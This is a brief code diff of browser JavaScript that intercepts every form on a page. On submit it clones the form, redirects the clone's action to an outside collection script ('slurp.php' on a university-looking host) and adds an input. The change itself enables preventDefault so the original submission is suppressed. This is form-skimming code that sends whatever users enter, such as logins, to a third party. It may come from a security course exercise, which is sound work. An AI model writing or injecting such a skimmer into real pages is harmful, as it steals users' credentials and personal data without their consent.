@@ -4,7 +4,7 @@ for (const form of forms) {
   // On submit of form, create a copy of the form with data with a new action
   // and submit it
   form.onsubmit = function (event) {
-    // event.preventDefault();
+    event.preventDefault();
     const newForm = form.cloneNode(true);
     newForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
     const input = document.createElement("input");
